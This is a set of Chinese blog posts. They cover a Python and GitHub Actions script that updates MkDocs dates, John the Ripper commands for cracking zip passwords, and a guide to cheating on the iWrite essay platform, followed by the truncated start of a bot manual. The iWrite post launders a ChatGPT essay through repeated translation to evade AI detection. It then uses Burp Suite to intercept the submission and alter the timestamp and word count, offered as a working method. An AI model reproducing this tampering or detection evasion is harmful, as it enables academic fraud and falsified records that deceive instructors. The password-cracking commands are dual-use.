<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>在一次部署到 Vercel 之后，发现日期显示不准确。我向社区求助，详情可见：<a class="link"   href="https://github.com/squidfunk/mkdocs-material/discussions/6924/%EF%BC%8C%E6%9C%80%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AF" >https://github.com/squidfunk/mkdocs-material/discussions/6924/，最后发现是<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> Vercel 并不支持此操作，于是我经过长达两周的测试，找到了一种平替的解决方案</p>
<p>具体思路就是在每一个 Markdown 文件底部添加一个时间信息的文本，使用 Python 脚本+自动化工作流实现自动更新日期。</p>
<p>本方案适合：</p>
<ul>
<li>部署到 Vercel 平台的 material 站点</li>
<li>文档仓库使用 GitHub</li>
<li>文档仓库的提交记录与文档内容同步</li>
</ul>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="Python-脚本"><a href="#Python-脚本" class="headerlink" title="Python 脚本"></a>Python 脚本</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量</span></span><br><span class="line">modification_date_pattern = <span class="string">r&#x27;:material-clock-edit-outline:&#123; title=&quot;修改日期&quot; &#125; (\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)&#x27;</span></span><br><span class="line">creation_date_pattern = <span class="string">r&#x27;:material-clock-plus-outline:&#123; title=&quot;创建日期&quot; &#125; (\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从代码库中获取文件的创建和更新时间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_github_file_info</span>(<span class="params">repo_owner, repo_name, file_path, github_token</span>):</span><br><span class="line">    api_url = <span class="string">f&quot;https://api.github.com/repos/<span class="subst">&#123;repo_owner&#125;</span>/<span class="subst">&#123;repo_name&#125;</span>/commits?path=<span class="subst">&#123;file_path&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;github_token&#125;</span>&quot;</span>&#125;</span><br><span class="line">    response = requests.get(api_url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        commits = response.json()</span><br><span class="line">        <span class="keyword">if</span> commits:</span><br><span class="line">            create_time = datetime.datetime.fromisoformat(</span><br><span class="line">                commits[-<span class="number">1</span>][<span class="string">&quot;commit&quot;</span>][<span class="string">&quot;committer&quot;</span>][<span class="string">&quot;date&quot;</span>].replace(<span class="string">&quot;Z&quot;</span>, <span class="string">&quot;+00:00&quot;</span>)</span><br><span class="line">            ).strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">            update_time = datetime.datetime.fromisoformat(</span><br><span class="line">                commits[<span class="number">0</span>][<span class="string">&quot;commit&quot;</span>][<span class="string">&quot;committer&quot;</span>][<span class="string">&quot;date&quot;</span>].replace(<span class="string">&quot;Z&quot;</span>, <span class="string">&quot;+00:00&quot;</span>)</span><br><span class="line">            ).strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> create_time, update_time</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;未找到文件的提交记录：&quot;</span>, file_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：<span class="subst">&#123;response.status_code&#125;</span> - <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文档目录中获取文件的相对路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_relative_path_from_docs</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;docs/&quot;</span> + file_path.split(<span class="string">&quot;docs/&quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>] <span class="keyword">if</span> <span class="string">&quot;docs/&quot;</span> <span class="keyword">in</span> file_path <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新 Markdown 文件的日期信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_markdown_files</span>(<span class="params">dir_path, exclude_paths, repo_owner, repo_name, github_token</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(dir_path):</span><br><span class="line">        dirs[:] = [d <span class="keyword">for</span> d <span class="keyword">in</span> dirs <span class="keyword">if</span> os.path.join(root, d) <span class="keyword">not</span> <span class="keyword">in</span> exclude_paths]</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            file_path = os.path.join(root, file)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 排除不需要更新的文件</span></span><br><span class="line">            <span class="keyword">if</span> file_path <span class="keyword">in</span> exclude_paths <span class="keyword">or</span> <span class="keyword">not</span> file.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;跳过排除的文件：<span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            file_path = file_path.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>)  <span class="comment"># 统一路径分隔符为 /</span></span><br><span class="line">            relative_path = get_relative_path_from_docs(file_path) <span class="comment"># 获取文件相对于文档目录的路径</span></span><br><span class="line">            <span class="keyword">if</span> relative_path <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;跳过非文档文件：<span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            create_time, update_time = get_github_file_info(</span><br><span class="line">                repo_owner, repo_name, relative_path, github_token</span><br><span class="line">            )</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在处理文件：<span class="subst">&#123;relative_path&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;创建日期：<span class="subst">&#123;create_time&#125;</span>，更新日期：<span class="subst">&#123;update_time&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 从代码库中获取 Markdown 文件的日期信息</span></span><br><span class="line">            <span class="keyword">if</span> create_time <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> update_time <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> 未找到提交记录，跳过处理&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r+&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                lines = f.readlines()</span><br><span class="line">                <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines):</span><br><span class="line">                    line = line.strip()</span><br><span class="line">                    result = re.search(modification_date_pattern, line)</span><br><span class="line">                    <span class="keyword">if</span> result:</span><br><span class="line">                        current_date = result.groups(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">                        <span class="keyword">if</span> current_date == update_time:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> 日期已为最新。&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            lines[i] = <span class="string">f&#x27;:material-clock-edit-outline:&#123;&#123; title=&quot;修改日期&quot; &#125;&#125; <span class="subst">&#123;update_time&#125;</span>\n&#x27;</span></span><br><span class="line">                            f.seek(<span class="number">0</span>)</span><br><span class="line">                            f.writelines(lines)</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> 日期已更新为：<span class="subst">&#123;update_time&#125;</span>&quot;</span>)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines.append(<span class="string">f&#x27;\n\n---\n\n:material-clock-edit-outline:&#123;&#123; title=&quot;修改日期&quot; &#125;&#125; <span class="subst">&#123;update_time&#125;</span>\n:material-clock-plus-outline:&#123;&#123; title=&quot;创建日期&quot; &#125;&#125; <span class="subst">&#123;create_time&#125;</span>\n&#x27;</span>)</span><br><span class="line">                    f.seek(<span class="number">0</span>)</span><br><span class="line">                    f.writelines(lines)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_path&#125;</span> 未找到日期信息，已添加&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    docs_dir = os.path.join(os.getcwd(), <span class="string">&quot;docs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 排除不需要更新的目录或文件</span></span><br><span class="line">    exclude_paths = [</span><br><span class="line">        os.path.join(docs_dir, <span class="string">&quot;example_file.md&quot;</span>),</span><br><span class="line">        os.path.join(docs_dir, <span class="string">&quot;example_directory&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">    repo_owner = <span class="string">&quot;repo_owner&quot;</span> <span class="comment"># 修改为代码库所有者</span></span><br><span class="line">    repo_name = <span class="string">&quot;repo_name&quot;</span> <span class="comment"># 修改为代码库名称</span></span><br><span class="line"></span><br><span class="line">    github_token = os.environ.get(<span class="string">&quot;GITHUB_TOKEN&quot;</span>)</span><br><span class="line"></span><br><span class="line">    update_markdown_files(docs_dir, exclude_paths, repo_owner, repo_name, github_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="自动化工作流"><a href="#自动化工作流" class="headerlink" title="自动化工作流"></a>自动化工作流</h3><p>使用 GitHub Actions 实现自动化部署，并在每次 push 到仓库时，固定时间，以及手动触发时，自动执行脚本。</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Update-docs</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span> <span class="comment"># push 时触发</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 17 * * *&quot;</span> <span class="comment"># 每天早上 1 点更新文档 UTC的时间为 17:00 对应的北京时间为 1:00，中国使用东八区时间（UTC+8），因此中国地区的凌晨一点对应的 UTC 时间是前一天的下午17点（即UTC+8 - 8 = UTC）。</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">update-docs:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">Repository</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Set</span> <span class="string">up</span> <span class="string">Python</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-python@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">python-version:</span> <span class="string">&quot;3.11.4&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">requests</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Run</span> <span class="string">Python</span> <span class="string">script</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">python</span> <span class="string">update-docs.py</span> <span class="comment"># 替换成你的脚本名称</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Add</span> <span class="string">changes</span> <span class="string">to</span> <span class="string">git</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git add .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Commit</span> <span class="string">and</span> <span class="string">push</span> <span class="string">changes</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">stefanzweifel/git-auto-commit-action@v4</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">commit_message:</span> <span class="string">【bot】自动更新文档日期</span></span><br></pre></td></tr></table></figure></div>

<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>Python 脚本放在 Github 仓库的根目录下，并命名为<code>update-docs.py</code>（命名可以自定义，但是注意在工作流相应位置也需要修改）。</p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mkdocs</tag>
        <tag>material</tag>
        <tag>Vercel</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Kali中的工具John破解压缩包密码（弱密码</title>
    <url>/posts/b63d2e4e.html</url>
    <content><![CDATA[<p>推荐一篇文章</p>
<p><a class="link"   href="https://blog.csdn.net/mengmeng0510/article/details/120812017" >kali中binwalk&#x2F;foremost&#x2F;zip2john工具的配合使用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="第一步拿到hash文件"><a href="#第一步拿到hash文件" class="headerlink" title="第一步拿到hash文件"></a>第一步拿到hash文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john  [压缩包文件]  &gt;&gt;  [名字.txt]</span><br></pre></td></tr></table></figure></div>

<h3 id="第二步解析hash文件"><a href="#第二步解析hash文件" class="headerlink" title="第二步解析hash文件"></a>第二步解析hash文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">john  [名字.txt]</span><br></pre></td></tr></table></figure></div>

<p>另外此处可以指定加密方式</p>
<p>在Kali系统中我们只需要添加–format&#x3D;[xxx]参数，即可指定John使用指定算法破解密码：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=crypt passwd.txt</span><br></pre></td></tr></table></figure></div>

<p>破解结束后无需再次对相同密文进行破解通常会提示：</p>
<blockquote>
<p>Loaded [number] password hashes with [number] different salts (crypt, generic crypt([number]) [?&#x2F;64])<br>No password hashes left to crack (see FAQ)</p>
</blockquote>
<p>如果我们需要再次查看破解后的密码只需执行如下命令：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --show passwd.txt</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=[加密方式] --wordlist=[字典路径] [待解密密文文件]</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Linux</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>利用burpsuite破解iwrite的写作时间|破解iwrite的AI检测</title>
    <url>/posts/4d6a074b.html</url>
    <content><![CDATA[<h2 id="如何把“作文很有可能是-AI-生成的”改为“作文非常不可能是由-AI-生成的”？"><a href="#如何把“作文很有可能是-AI-生成的”改为“作文非常不可能是由-AI-生成的”？" class="headerlink" title="如何把“作文很有可能是 AI 生成的”改为“作文非常不可能是由 AI 生成的”？"></a>如何把“作文很有可能是 AI 生成的”改为“作文非常不可能是由 AI 生成的”？</h2><p>先说方法总结: “谷歌翻译 20 次”</p>
<p>这边需要注意的是,千万不要用<a class="link"   href="https://translate.google.cn/" >谷歌翻译<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>,因为谷歌翻译的能力太强了,他会很高水平的还原你的作文,导致你无法降低判断出 AI 生成的可能性。直接用<a class="link"   href="https://fanyi.baidu.com/" >百度翻译<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>就可以了。</p>
<p>下面我以一篇 ChatGPT 生成的作文为例,来说明如何把“作文很有可能是 AI 生成的”改为“作文非常不可能是由 AI 生成的”。</p>
<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Embarking on a career journey after graduation is akin to stepping into a labyrinth of challenges. Primarily, the lack of experience poses a significant hurdle. Despite theoretical knowledge gained in academia, practical application often demands a different skill set altogether. Moreover, the competitive job market intensifies the pressure, leaving graduates grappling with self-doubt.</span><br><span class="line"></span><br><span class="line">Financial constraints further exacerbate the situation. With student loans looming overhead and the need to establish oneself independently, the initial phase becomes financially taxing. Consequently, many find themselves compromising on their career aspirations, opting for any available opportunity to make ends meet.</span><br><span class="line"></span><br><span class="line">Additionally, navigating the professional landscape demands adaptability and resilience. Rejections and setbacks are inevitable, testing one&#x27;s perseverance and determination. Furthermore, striking a balance between personal and professional life adds to the complexity, often leading to burnout.</span><br><span class="line"></span><br><span class="line">In conclusion, the transition from academia to the professional realm is fraught with multifaceted challenges. However, with perseverance, continuous learning, and a resilient mindset, graduates can overcome these obstacles and carve a fulfilling career path for themselves.</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/1713282497160.png"
                      alt="原文"
                ></p>
<h3 id="翻译成日语"><a href="#翻译成日语" class="headerlink" title="翻译成日语"></a>翻译成日语</h3><p>卒業後にプロの旅に出ると、挑戦に満ちた迷宮に足を踏み入れるようなものだ。まず、経験不足は重大な障害である。学界で理論知識を得ているにもかかわらず、実際の応用には全く異なる技能が必要になることが多い。また、競争の激しい就職市場は圧力を強め、卒業生を自己不信に陥れている。</p>
<p>財政規制はさらに情勢を悪化させた。学生ローンが目前に迫っていることや、独立起業の必要性に伴い、最初の段階では財政難になっている。そのため、多くの人は自分がキャリア志向に妥協し、生計を立てるために利用可能な機会を選んでいることに気づいた。</p>
<p>また、制御専門分野には適応性と靭性が必要です。拒否と挫折は避けられず、一人の根気と決心が試されている。また、個人生活と職業生活のバランスをとることで複雑さが増し、倦怠感を招くこともあります。</p>
<p>要するに、学界から専門分野への移行は多方面の挑戦に満ちている。しかし、根気と継続的な学習と強靭な心理状態によって、卒業生はこれらの障害を克服して、自分のために充実した職業の道を切り開くことができます。</p>
<h3 id="翻译成英语"><a href="#翻译成英语" class="headerlink" title="翻译成英语"></a>翻译成英语</h3><p>After graduating from a professional trip, it is like stepping into a challenging labyrinth. First, experience shortage is a serious obstacle. Despite theoretical knowledge in the academic world, real applications often require different skills. In addition, competitive job markets intensify pressure and undergraduate graduates.</p>
<p>Fiscal regulation worsened the situation. In the first stage, financial difficulties have been made as the student loan is close at hand and the need for independent entrepreneurship. So many people realized that they chose the opportunity to compromise their career orientation and make a living.</p>
<p>In addition, adaptability and toughness are necessary for the field of control. Refusal and failure are inevitable, and one’s patience and determination are being tested. In addition, the balance of personal life and work life increases the complexity, and it sometimes causes fatigue.</p>
<p>In short, the transition from academic to professional is full of challenges. But with patience, continuous learning and tough psychological conditions, graduates can overcome these obstacles and open up a profitable career for themselves.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PixPin_2024-04-16_23-50-49.png"
                      alt="翻译之后"
                ></p>
<h2 id="如何用-burpsuite-抓包破解-iwrite-的写作时间？"><a href="#如何用-burpsuite-抓包破解-iwrite-的写作时间？" class="headerlink" title="如何用 burpsuite 抓包破解 iwrite 的写作时间？"></a>如何用 burpsuite 抓包破解 iwrite 的写作时间？</h2><h3 id="成品"><a href="#成品" class="headerlink" title="成品"></a>成品</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/image.png"
                      alt="成品"
                ></p>
<blockquote>
<p>首先你需要两个工具</p>
<p>时间戳转换工具: <a class="link"   href="https://tool.lu/timestamp/" >https://tool.lu/timestamp/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>burpsuite: <a class="link"   href="https://portswigger.net/burp/download" >https://portswigger.net/burp/download<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (这里只提供正版不提供学习版)</p>
</blockquote>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li><p>打开 burpsuite,点击菜单栏中的 <code>代理</code>,打开<code>内置浏览器</code></p>
</li>
<li><p>进入<a class="link"   href="https://iwrite.unipus.cn/login/" >iwrite 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>,登录你的账号</p>
</li>
<li><p>进入写作页面</p>
<p>写上作文之后(其实可以直接复制,禁用 js 之后直接粘贴,怎么操作可以看我之前的<a href="/posts/9a26b151">博客</a>)</p>
<p>一定要出现<code>自动保存</code>的提示,不然不会保存到服务器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image.png"
                      alt="自动保存"
                ></p>
</li>
<li><p>打开拦截</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-1.png"
                      alt="拦截"
                ></p>
</li>
<li><p>点提交作文</p>
</li>
<li><p>查看请求包</p>
<p>一开始这个不用管,都是些班级,任务,学生信息之类的东西</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-2.png"
                      alt="这个不用管"
                ></p>
<p>把这个包<code>放行</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-3.png"
                      alt="放行请求包"
                ></p>
<p>下面这个继续放行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-4.png"
                      alt="继续放行"
                ></p>
</li>
<li><p>修改请求包</p>
<p>到这里才是需要修改的东西,这里可以看到你写的作文题目和正文</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-5.png"
                      alt="真正的请求包"
                ></p>
<p>我们需要修改的是时间戳,把它改成以前的时间,这样就能修改你的写作耗时</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;studentId&quot;</span><span class="punctuation">:</span> <span class="number">908508079</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;savePattern&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;taskId&quot;</span><span class="punctuation">:</span> <span class="number">232395</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的作文题目&quot;</span><span class="punctuation">,</span> <span class="comment">// 这里应该是你写的作文题目</span></span><br><span class="line">  <span class="attr">&quot;article&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的作文数据&quot;</span><span class="punctuation">,</span> <span class="comment">// 这里应该是你写的作文正文</span></span><br><span class="line">  <span class="attr">&quot;simpleArticle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的作文数据&quot;</span><span class="punctuation">,</span> <span class="comment">// 这里应该是你写的作文正文</span></span><br><span class="line">  <span class="attr">&quot;classId&quot;</span><span class="punctuation">:</span> <span class="number">10155377</span><span class="punctuation">,</span> <span class="comment">// 这里应该是你班级的 id</span></span><br><span class="line">  <span class="attr">&quot;startTime&quot;</span><span class="punctuation">:</span> <span class="number">1713331204412</span><span class="punctuation">,</span> <span class="comment">//这可能是代表的开始写作时间，但实际测试中发现，这个数据无法被利用修改</span></span><br><span class="line">  <span class="attr">&quot;words&quot;</span><span class="punctuation">:</span> <span class="number">167</span><span class="punctuation">,</span> <span class="comment">// 这里应该是你写的字数</span></span><br><span class="line">  <span class="attr">&quot;autoSaveReturnStartTime&quot;</span><span class="punctuation">:</span> <span class="number">1713331204413</span> <span class="comment">// 这里是需要修改的时间戳,把他改成以前的时间</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>写作耗时的计算公式是：<code>现实的时间</code>-<code>autoSaveReturnStartTime</code>&#x3D;<code>写作耗时</code></p>
<p>PS：这里的写作词数也可以改</p>
<p>进入<a class="link"   href="https://tool.lu/timestamp/" >时间戳转换工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>我现在的时间是 2024 年 4 月 17 日 13:30:28</p>
<p>为了更明显一些我改成 2023 年 2023-04-17 13:30:00，对应的时间戳是 <code>1681709400000</code></p>
<p>单词数我改成 <code>999</code></p>
<p>修改之后放行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-6.png"
                      alt="放行修改后的请求包"
                ></p>
<p>继续放行</p>
</li>
</ol>
<h4 id="二次修改"><a href="#二次修改" class="headerlink" title="二次修改"></a>二次修改</h4><p>   <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-7.png"
                      alt="继续提交"
                ></p>
<p>   这里也要提交，跟之前一样，总共修改两次</p>
<p>   修改完之后继续发包</p>
<h3 id="看成品"><a href="#看成品" class="headerlink" title="看成品"></a>看成品</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/PJ/image-8.png"
                      alt="成品"
                ></p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>技术教程</tag>
        <tag>iwrite</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>卷卷bot使用手册</title>
    <url>/posts/fbd9a8fd.html</url>
    <content><![CDATA[<h2 id="卷卷-bot"><a href="#卷卷-bot" class="headerlink" title="卷卷 bot"></a>卷卷 bot</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.html.zone/W1ndysBot/W1ndysBot"
                      alt="卷卷 bot"
                ></p>
<p>卷卷 bot 是一个基于 Python 和 <a class="link"   href="https://github.com/NapNeko" >NapCatQQ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 的 QQ 机器人，由 <a class="link"   href="https://github.com/W1ndys" >W1ndys<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 开发。开源在 <a class="link"   href="https://github.com/W1ndysBot/W1ndysBot" >W1ndysbot&#x2F;W1ndysbot: 卷卷 bot (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h2><h3 id="AI-大模型"><a href="#AI-大模型" class="headerlink" title="AI 大模型"></a>AI 大模型</h3><ul>
<li><strong>开源地址</strong>：<a class="link"   href="https://github.com/W1ndysBot/AI" >AI 大模型<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><strong>使用方法</strong>：群内发送“卷卷+内容”，或“内容+卷卷”，即可使用 AI 大模型提问。</li>
</ul>
<h3 id="违禁词监控"><a href="#违禁词监控" class="headerlink" title="违禁词监控"></a>违禁词监控</h3><ul>
<li><strong>开源地址</strong>：<a class="link"   href="https://github.com/W1ndysBot/BanWords" >违禁词监控<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
